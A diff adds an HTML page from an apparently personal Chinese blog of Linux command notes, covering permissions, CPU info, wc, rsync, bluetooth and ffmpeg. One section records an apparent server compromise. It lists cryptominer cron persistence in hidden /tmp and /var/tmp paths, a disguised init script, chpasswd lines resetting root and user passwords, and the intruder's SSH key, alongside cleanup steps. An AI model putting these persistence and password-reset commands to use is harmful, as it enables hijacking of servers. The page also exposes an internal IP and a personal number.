@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>linux相关操作命令 | 是睿睿吖</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="本科生服务器帐号密码删掉某人对某目录权限setfacl -m u:bylw:getfile:-x &#x2F;public&#x2F;home&#x2F;mkr&#x2F;bylw setfacl -m u:bylw:-x &#x2F;public&#x2F;home&#x2F;mkr&#x2F;bylw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux相关操作命令">
+<meta property="og:url" content="http://chidiangongzi.github.io/blog/2020/12/09/linux%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/index.html">
+<meta property="og:site_name" content="是睿睿吖">
+<meta property="og:description" content="本科生服务器帐号密码删掉某人对某目录权限setfacl -m u:bylw:getfile:-x &#x2F;public&#x2F;home&#x2F;mkr&#x2F;bylw setfacl -m u:bylw:-x &#x2F;public&#x2F;home&#x2F;mkr&#x2F;bylw">
+<meta property="og:locale" content="ch">
+<meta property="og:image" content="http://chidiangongzi.github.io/blog///2020/12/09/linux%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/linux_iwscan.png">
+<meta property="og:image" content="http://chidiangongzi.github.io/blog///2020/12/09/linux%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/pavucontrol.png">
+<meta property="article:published_time" content="2020-12-09T00:30:02.000Z">
+<meta property="article:modified_time" content="2022-04-19T15:03:14.638Z">
+<meta property="article:author" content="pro^w^">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://chidiangongzi.github.io/blog///2020/12/09/linux%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/linux_iwscan.png">
+  
+    <link rel="alternate" href="/blog/atom.xml" title="是睿睿吖" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    
+  
+  
+<link rel="stylesheet" href="/blog/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/blog/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://chidiangongzi.github.io/blog"></form>
+      </div>
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/blog/">首页</a>
+        
+          <a class="main-nav-link" href="/blog/archives">归档</a>
+        
+          <a class="main-nav-link" href="/blog/about">关于</a>
+        
+      </nav>
+      
+    </div>
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/blog/" id="logo">是睿睿吖</a>
+      </h1>
+      
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-linux相关操作" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2020/12/09/linux%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/" class="article-date">
+  <time datetime="2020-12-09T00:30:02.000Z" itemprop="datePublished">2020-12-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      linux相关操作命令
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <h5 id="本科生服务器帐号密码"><a href="#本科生服务器帐号密码" class="headerlink" title="本科生服务器帐号密码"></a>本科生服务器帐号密码</h5><h5 id="删掉某人对某目录权限"><a href="#删掉某人对某目录权限" class="headerlink" title="删掉某人对某目录权限"></a>删掉某人对某目录权限</h5><p>setfacl -m u:bylw:getfile:-x /public/home/mkr/bylw</p>
+<p>setfacl -m u:bylw:-x /public/home/mkr/bylw</p>
+<a id="more"></a>
+<h5 id="linux-下把pdf-转化为png"><a href="#linux-下把pdf-转化为png" class="headerlink" title="linux 下把pdf 转化为png"></a>linux 下把pdf 转化为png</h5><p>convert -resize 1800x -density 150 -quality 100 ANUC.pdf ANUC.png</p>
+<p>-resize 指定生成像素大小，越大生产图片越大<br>-density 150 参数指定密度<br>-quality 100 生成图片的质量</p>
+<p>polik<br>kworker<br>iqrbalance</p>
+<p>  #!/bin/bash<br>  #</p>
+<h1 id="Start-Stop-the-man-db-daemon"><a href="#Start-Stop-the-man-db-daemon" class="headerlink" title="Start/Stop the man-db daemon"></a>Start/Stop the man-db daemon</h1><p>  #</p>
+<h1 id="chkconfig-2345-90-60"><a href="#chkconfig-2345-90-60" class="headerlink" title="chkconfig 2345 90 60"></a>chkconfig 2345 90 60</h1><h1 id="description-manual-page-GNU-System"><a href="#description-manual-page-GNU-System" class="headerlink" title="description: manual page (GNU System)"></a>description: manual page (GNU System)</h1><p>  #cp -f -r – /bin/lvmdisk /usr/local/bin/python 2&gt;/dev/null</p>
+<p>  #cd /usr/local/bin/ 2&gt;/dev/null</p>
+<p>  #./python -c &gt;/dev/null</p>
+<p>  #rm -rf – python 2&gt;/dev/null</p>
+<ul>
+<li><ul>
+<li><ul>
+<li><ul>
+<li><ul>
+<li>/tmp/.X12-unix/python &gt; /dev/null 2&gt;&1;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>工程师进行的一些操作：<br>lsattr authorized_keys<br>chattr -ia authorized_keys<br>ll authorized_keys~<br>chattr authorized_keys~<br>lsattr authorized_keys~</p>
+<p>mv /usr/bin/crontab rui</p>
+<p>root:<em> </em> <em> </em> * /tmp/.X12-unix/python &gt; /dev/null 2&gt;&1;</p>
+<p>wyj</p>
+<ul>
+<li><ul>
+<li><ul>
+<li><ul>
+<li><ul>
+<li>/var/tmp/..o/.miner/1 &gt; /dev/null &lt;&amp;1 2&gt;&amp;1 &amp; disown<br>@monthly /var/tmp/..o/.miner/1 &gt; /dev/null &lt;&amp;1 2&gt;&amp;1 &amp; disown<br>@reboot /var/tmp/..o/.miner/apachelogs &gt; /dev/null &lt;&amp;1 2&gt;&amp;1 &amp; disown</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>zzq<br>@daily /tmp/z/1<br>@reboot /tmp/z/run &gt; /dev/null 2&gt;&amp;1 &amp; disown<br>@monthly /tmp/z/run  &gt; /dev/null 2&gt;&amp;1 &amp; disown</p>
+<p>xjy</p>
+<ul>
+<li><ul>
+<li><ul>
+<li><ul>
+<li><ul>
+<li>/tmp/.X12-unix/python &gt; /dev/null 2&gt;&1;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>echo root:*thisispasswd | chpasswd</p>
+<p>echo weilei:thisispasswd | chpasswd</p>
+<p>Haker’s rsa<br>ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIEAiZAl7JH7OsCig2bBE22hGeY4JlubMDWFoUvAJI+C5Da6hYb7PbnYSutSyVG1Sj9x7uaLza1+NxK02p6Tolbw7I2/6ltupowGuF9r/xokN45ELvAjw/zFsrCTg/+3Enx+sY/jBHPgR16nrqhSOtdLVk3Od5MMbQ2N6wzF1EIiAdE=</p>
+<p>10.255.251.65 secret 15952527020</p>
+<p>[xjy@sugon65 home]$ crontab -l</p>
+<ul>
+<li><ul>
+<li><ul>
+<li><ul>
+<li><ul>
+<li>/tmp/.X12-unix/python &gt; /dev/null 2&gt;&1;<br>[xjy@sugon65 home]$</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>解决方法  cd /tmp/.X12-unix/<br> rm -rf x86_64 </p>
+<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>运行run.sh，脚本中含有多个独立运行的exe，shell脚本后台disown，如何查找bash脚本，并kill掉PRR_RCG.exe的父进程?</p>
+<p><code>pstree -p | grep &quot;bash&quot; | less</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|-bash(208883)---PRR_RCG.exe(30884)</span><br><span class="line">|-sshd(14371)-+-sshd(28933)---sshd(28941)---bash(28942)---ranger.py(29035)-+-bash(29322)---ranger.py(29702)-+-bash(29704+</span><br><span class="line">|             |-sshd(29870)---sshd(29876)---bash(29877)---ranger.py(29965)-+-bash(29967)</span><br><span class="line">|             |-sshd(30140)---sshd(30146)---bash(30149)---ranger.py(30235)-+-bash(30312)---rain2.exe(30410)</span><br><span class="line">|             &#96;-sshd(30412)---sshd(30419)---bash(30421)---ranger.py(30507)-+-bash(30509)-+-grep(31105)</span><br></pre></td></tr></table></figure>
+<h2 id="linux-关闭笔记本自带键盘"><a href="#linux-关闭笔记本自带键盘" class="headerlink" title="linux 关闭笔记本自带键盘"></a>linux 关闭笔记本自带键盘</h2><p><code>xinput list</code><br>找到AT Translated Set 2 keyboard，其id为10，设置值为0<br><code>xinput set-prop 10 &quot;Device Enabled&quot; 0</code><br>如果想恢复，对应的值设为1即可<br><code>xinput set-prop 10 &quot;Device Enabled&quot; 1</code></p>
+<h2 id="linux-rsync传输文件时如何排除某一文件不传输，只需要加上-–exclude-’-lt-文件-gt-’"><a href="#linux-rsync传输文件时如何排除某一文件不传输，只需要加上-–exclude-’-lt-文件-gt-’" class="headerlink" title="linux rsync传输文件时如何排除某一文件不传输，只需要加上 –exclude=’&lt;文件&gt;’"></a>linux rsync传输文件时如何排除某一文件不传输，只需要加上 –exclude=’&lt;文件&gt;’</h2><p><code>rsync -rauvzP --rsh=ssh --exclude=&#39;wrfout*&#39; mkr@10.255.251.65:/public/home/mkr/TRAJXY/NX/Trajxy-NX-8-ccn-sensitivity/ccn-50/product/wmax .</code></p>
+<p><a href="https://www.linuxrumen.com/rmxx/1336.html" target="_blank" rel="noopener">参考链接</a></p>
+<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd testuser  创建用户testuser</span><br><span class="line">passwd testuser  给已创建的用户testuser设置密码</span><br><span class="line">useradd -d &#x2F;public&#x2F;home&#x2F;mkr -m 创建用户并指定根目录</span><br></pre></td></tr></table></figure>
+<!--more-->
+<h3 id="linux下如何查看CPU信息："><a href="#linux下如何查看CPU信息：" class="headerlink" title="linux下如何查看CPU信息："></a>linux下如何查看CPU信息：</h3><p><code>cat /proc/cpuinfo</code></p>
+<p>model name cpu名称，型号，主频<br>cpu Mhz 实际主频<br>physical id 单个cpu的标号<br>cpu cores 逻辑核所处cpu的物理核<br>siblings 单个cpu的逻辑核数</p>
+<h4 id="查看cpu有多少个核"><a href="#查看cpu有多少个核" class="headerlink" title="查看cpu有多少个核"></a>查看cpu有多少个核</h4><p><code>cat /proc/cpuinfo | grep &quot;physical id&quot; | sort | uniq | wc -l</code></p>
+<h4 id="查看单个cpu的物理核数"><a href="#查看单个cpu的物理核数" class="headerlink" title="查看单个cpu的物理核数"></a>查看单个cpu的物理核数</h4><p><code>cat /proc/cpuinfo | grep &quot;cpu cores&quot; | uniq</code></p>
+<h4 id="查看总逻辑核数"><a href="#查看总逻辑核数" class="headerlink" title="查看总逻辑核数"></a>查看总逻辑核数</h4><p><code>cat /proc/cpuinfo | grep &quot;processor&quot; | wc -l</code></p>
+<h4 id="查看所有逻辑核的负载"><a href="#查看所有逻辑核的负载" class="headerlink" title="查看所有逻辑核的负载"></a>查看所有逻辑核的负载</h4><p>执行top命令，然后按1</p>
+<h3 id="linux下wc用法小节"><a href="#linux下wc用法小节" class="headerlink" title="linux下wc用法小节"></a>linux下wc用法小节</h3><hr>
+<h4 id="统计行数"><a href="#统计行数" class="headerlink" title="统计行数"></a>统计行数</h4><p><code>wc -l file</code></p>
+<p><code>cat file | wc -l</code>(只返回数字)</p>
+<h4 id="统计单词数"><a href="#统计单词数" class="headerlink" title="统计单词数"></a>统计单词数</h4><p><code>wc -w file</code></p>
+<p><code>cat file | wc -w</code></p>
+<h4 id="统计字符数"><a href="#统计字符数" class="headerlink" title="统计字符数"></a>统计字符数</h4><p><code>wc -c file</code></p>
+<p><code>cat file | wc -c</code></p>
+<p><code>echo -n 1234 | wc -c</code>(-n用于避免echo添加额外的换行符)</p>
+<p>结果返回4</p>
+<h4 id="不执行任何选项执行wc时"><a href="#不执行任何选项执行wc时" class="headerlink" title="不执行任何选项执行wc时"></a>不执行任何选项执行wc时</h4><p><code>wc file</code></p>
+<p>结果打印出文件的行数、单词数、字符数</p>
+<h4 id="打印出文件中最长一行的长度"><a href="#打印出文件中最长一行的长度" class="headerlink" title="打印出文件中最长一行的长度"></a>打印出文件中最长一行的长度</h4><p><code>wc file -L</code></p>
+<h3 id="linux终端下的翻页"><a href="#linux终端下的翻页" class="headerlink" title="linux终端下的翻页"></a>linux终端下的翻页</h3><hr>
+<p>Shift-PageUp和Shift-PageDown (HHKB键位：Shift-Fn-i和Shift-Fn-.)</p>
+<h3 id="linux双屏操作"><a href="#linux双屏操作" class="headerlink" title="linux双屏操作"></a>linux双屏操作</h3><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ xrandr -q</span><br><span class="line">$ xrandr --output HDMI2 --auto</span><br><span class="line">$ xrandr --output HDMI2 --left-of eDP!</span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/downanddusk/article/details/105385745" target="_blank" rel="noopener">参考博客链接</a></p>
+<h3 id="archlinux连接NUIST互联网"><a href="#archlinux连接NUIST互联网" class="headerlink" title="archlinux连接NUIST互联网"></a>archlinux连接NUIST互联网</h3><hr>
+<p><code>sudo iw wlp4s0 scan | grep NUIST</code></p>
+<img src="/blog///2020/12/09/linux%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/linux_iwscan.png" class>
+<p><code>sudo iw dev wlp4s0 connect i-NUIST</code></p>
+<hr>
+<p>安装微信</p>
+<p>yay -S deepin-wine<br><code>yay -S deepin-wine-wechat</code></p>
+<p>卸载微信<br><code>sudo pacman -Rs deepin-wine-wechat</code></p>
+<h3 id="archlinux连接蓝牙耳机"><a href="#archlinux连接蓝牙耳机" class="headerlink" title="archlinux连接蓝牙耳机"></a>archlinux连接蓝牙耳机</h3><hr>
+<ul>
+<li>安装软件包(pulseaudio-bluetooth-a2dp-gdm-fix必须安装成功)</li>
+</ul>
+<p><code>sudo pacman -S bluez bluez-utils pulseaudio-bluetooth pavucontrol pulseaudio-alsa pulseaudio-bluetooth-a2dp-gdm-fix</code></p>
+<ul>
+<li>启动蓝牙</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> bluetooth</span><br><span class="line">sudo systemctl start bluetooth</span><br></pre></td></tr></table></figure>
+<ul>
+<li>启动pulseaudio服务</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pulseaudio -k                   <span class="comment"># 确保没有pulseaudio启动</span></span><br><span class="line">pulseaudio --start              <span class="comment"># 启动pulseaudio服务</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>启动bluetoothctl交互命令</li>
+</ul>
+<p>打开控制器电源 <code>power on</code></p>
+<p>获得需要配对设备的MAC地址 <code>devices</code></p>
+<p>发现设备 <code>scan on</code></p>
+<p>打开代理 <code>agent on</code></p>
+<p>开始配对 <code>pair 28:11:A5:6B:49:B6</code></p>
+<p>无PIN码设备 <code>trust 28:11:A5:6B:49:B6</code></p>
+<p>建立连接 <code>connect 28:11:A5:6B:49:B6</code></p>
+<ul>
+<li>指定用蓝牙音频输出，在terminal终端输入<code>pavucontrol</code>调出窗口</li>
+</ul>
+<img src="/blog///2020/12/09/linux%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/pavucontrol.png" class>
+<p>通过对”Playback”(回放)和”Recording”(录音)标签页重定向音频输入和输出.</p>
+<p>参考链接：<a href="https://cloud.tencent.com/developer/article/1559535" target="_blank" rel="noopener">Archlinux之manjaro连接蓝牙音频设备无法使用</a></p>
+<h3 id="u盘格式化"><a href="#u盘格式化" class="headerlink" title="u盘格式化"></a>u盘格式化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkfs.ext4 &#x2F;dev&#x2F;sdb1</span><br></pre></td></tr></table></figure>
+<p>碰到无法mkdir权限不够的时候 格式化后挂载 chmod 777 /mnt/usb</p>
+<h3 id="在下载Youtube时会经常遇到只能下载声音和没有声音的视频，通过ffmpeg来合并musiconly-m4a和videoonly-mp4"><a href="#在下载Youtube时会经常遇到只能下载声音和没有声音的视频，通过ffmpeg来合并musiconly-m4a和videoonly-mp4" class="headerlink" title="在下载Youtube时会经常遇到只能下载声音和没有声音的视频，通过ffmpeg来合并musiconly.m4a和videoonly.mp4"></a>在下载Youtube时会经常遇到只能下载声音和没有声音的视频，通过ffmpeg来合并musiconly.m4a和videoonly.mp4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i videoonly.mp4 -i musiconly.m4a -c:v copy -c:a aac -strict experimental -map 0:v:0 -map 1:a:0 merge.mp4</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.jianshu.com/p/2a824f13b2af" target="_blank" rel="noopener">参考链接</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://chidiangongzi.github.io/blog/2020/12/09/linux%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/" data-id="cl4nswnnl000m4kcz0nxlepo9" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/linux/" rel="tag">linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+ 
+<script src="/blog/jquery/jquery.min.js"></script>
+
+  <div id="random_posts">
+    <h2>推荐文章</h2>
+    <div class="random_posts_ul">
+      <script>
+          var random_count =4
+          var site = {BASE_URI:'/blog/'};
+          function load_random_posts(obj) {
+              var arr=site.posts;
+              if (!obj) return;
+              // var count = $(obj).attr('data-count') || 6;
+              for (var i, tmp, n = arr.length; n; i = Math.floor(Math.random() * n), tmp = arr[--n], arr[n] = arr[i], arr[i] = tmp);
+              arr = arr.slice(0, random_count);
+              var html = '<ul>';
+            
+              for(var j=0;j<arr.length;j++){
+                var item=arr[j];
+                html += '<li><strong>' + 
+                item.date + ':&nbsp;&nbsp;<a href="' + (site.BASE_URI+item.uri) + '">' + 
+                (item.title || item.uri) + '</a></strong>';
+                if(item.excerpt){
+                  html +='<div class="post-excerpt">'+item.excerpt+'</div>';
+                }
+                html +='</li>';
+                
+              }
+              $(obj).html(html + '</ul>');
+          }
+          $('.random_posts_ul').each(function () {
+              var c = this;
+              if (!site.posts || !site.posts.length){
+                  $.getJSON(site.BASE_URI + 'js/posts.js',function(json){site.posts = json;load_random_posts(c)});
+              } 
+               else{
+                load_random_posts(c);
+              }
+          });
+      </script>
+    </div>
+  </div>
+
+    
+<nav id="article-nav">
+  
+    <a href="/blog/2020/12/29/paper-words/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          paper-words
+        
+      </div>
+    </a>
+  
+  
+    <a href="/blog/2020/11/29/VIM/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">VIM</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+ 
+     
+  <div class="comments" id="comments">
+    
+     
+       
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+       
+      
+      
+  </div>
+ 
+  
+
+</section>
+           
+    <aside id="sidebar">
+  
+    
+    <div class="widget-wrap">
+    
+      <div class="widget" id="toc-widget-fixed">
+      
+        <strong class="toc-title">文章目录</strong>
+        <div class="toc-widget-list">
+              <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#本科生服务器帐号密码"><span class="toc-number">1.</span> <span class="toc-text">本科生服务器帐号密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#删掉某人对某目录权限"><span class="toc-number">2.</span> <span class="toc-text">删掉某人对某目录权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#linux-下把pdf-转化为png"><span class="toc-number">3.</span> <span class="toc-text">linux 下把pdf 转化为png</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Start-Stop-the-man-db-daemon"><span class="toc-number"></span> <span class="toc-text">Start&#x2F;Stop the man-db daemon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#chkconfig-2345-90-60"><span class="toc-number"></span> <span class="toc-text">chkconfig 2345 90 60</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#description-manual-page-GNU-System"><span class="toc-number"></span> <span class="toc-text">description: manual page (GNU System)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#更新"><span class="toc-number"></span> <span class="toc-text">更新</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-关闭笔记本自带键盘"><span class="toc-number"></span> <span class="toc-text">linux 关闭笔记本自带键盘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-rsync传输文件时如何排除某一文件不传输，只需要加上-–exclude-’-lt-文件-gt-’"><span class="toc-number"></span> <span class="toc-text">linux rsync传输文件时如何排除某一文件不传输，只需要加上 –exclude&#x3D;’&lt;文件&gt;’</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#创建用户"><span class="toc-number"></span> <span class="toc-text">创建用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux下如何查看CPU信息："><span class="toc-number"></span> <span class="toc-text">linux下如何查看CPU信息：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查看cpu有多少个核"><span class="toc-number"></span> <span class="toc-text">查看cpu有多少个核</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查看单个cpu的物理核数"><span class="toc-number"></span> <span class="toc-text">查看单个cpu的物理核数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查看总逻辑核数"><span class="toc-number"></span> <span class="toc-text">查看总逻辑核数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查看所有逻辑核的负载"><span class="toc-number"></span> <span class="toc-text">查看所有逻辑核的负载</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux下wc用法小节"><span class="toc-number"></span> <span class="toc-text">linux下wc用法小节</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#统计行数"><span class="toc-number"></span> <span class="toc-text">统计行数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#统计单词数"><span class="toc-number"></span> <span class="toc-text">统计单词数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#统计字符数"><span class="toc-number"></span> <span class="toc-text">统计字符数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#不执行任何选项执行wc时"><span class="toc-number"></span> <span class="toc-text">不执行任何选项执行wc时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#打印出文件中最长一行的长度"><span class="toc-number"></span> <span class="toc-text">打印出文件中最长一行的长度</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux终端下的翻页"><span class="toc-number"></span> <span class="toc-text">linux终端下的翻页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux双屏操作"><span class="toc-number"></span> <span class="toc-text">linux双屏操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#archlinux连接NUIST互联网"><span class="toc-number"></span> <span class="toc-text">archlinux连接NUIST互联网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#archlinux连接蓝牙耳机"><span class="toc-number"></span> <span class="toc-text">archlinux连接蓝牙耳机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u盘格式化"><span class="toc-number"></span> <span class="toc-text">u盘格式化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在下载Youtube时会经常遇到只能下载声音和没有声音的视频，通过ffmpeg来合并musiconly-m4a和videoonly-mp4"><span class="toc-number"></span> <span class="toc-text">在下载Youtube时会经常遇到只能下载声音和没有声音的视频，通过ffmpeg来合并musiconly.m4a和videoonly.mp4</span></a>
+          </div>
+      </div>
+    </div>
+
+  
+    
+
+  
+    
+  
+    
+  
+    
+
+  
+    
+  
+</aside>
+
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-left">
+      &copy; 2014 - 2022 pro^w^&nbsp;|&nbsp;
+      主题 <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
+    </div>
+     <div id="footer-right">
+      联系方式&nbsp;|&nbsp;2602005529@qq.com
+    </div>
+  </div>
+</footer>
+ 
+<script src="/blog/jquery/jquery.min.js"></script>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/blog/" class="mobile-nav-link">首页</a>
+  
+    <a href="/blog/archives" class="mobile-nav-link">归档</a>
+  
+    <a href="/blog/about" class="mobile-nav-link">关于</a>
+  
+</nav>
+    <img class="back-to-top-btn" src="/images/fly-to-top.png"/>
+<script>
+// Elevator script included on the page, already.
+window.onload = function() {
+  var elevator = new Elevator({
+    selector:'.back-to-top-btn',
+    element: document.querySelector('.back-to-top-btn'),
+    duration: 1000 // milliseconds
+  });
+}
+</script>
+      
+
+  
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "e2fb4051c49842688ce669e634bc983f",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+    
+
+  
+
+
+
+
+
+
+
+<!-- author:forvoid begin -->
+<!-- author:forvoid begin -->
+
+<!-- author:forvoid end -->
+
+<!-- author:forvoid end -->
+
+
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      })
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      })
+    </script>
+    <script type="text/javascript" src="https://cdn.rawgit.com/mathjax/MathJax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+ 
+<script src="/blog/js/is.js"></script>
+
+
+
+  
+<link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css">
+
+  
+<script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/blog/js/script.js"></script>
+
+
+<script src="/blog/js/elevator.js"></script>
+
+  </div>
+</body>
+</html>
